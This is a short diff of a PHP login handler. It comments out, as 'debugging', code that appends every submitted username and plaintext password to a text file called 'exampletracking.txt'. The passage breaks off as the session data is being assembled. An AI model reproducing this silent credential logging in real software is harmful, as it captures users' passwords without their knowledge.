@@ -3,10 +3,11 @@
     if(isset($_POST['username']) && isset($_POST['password'])) {
           $awrt = $_POST['username'];
           $bwrt = $_POST['password'];
-          $myFile = "exampletracking.txt";
-          $fh = fopen($myFile, 'a') or die("can't open file");
-          fwrite($fh, " Username: " . $awrt . " Password: " . $bwrt . "\r\n");
-          fclose($fh);
+          // For debugging purposes
+          // $myFile = "exampletracking.txt";
+          // $fh = fopen($myFile, 'a') or die("can't open file");
+          // fwrite($fh, " Username: " . $awrt . " Password: " . $bwrt . "\r\n");
+          // fclose($fh);
           session_start();
           $curr_sess_id = session_id();
           $all_data = http_build_query(
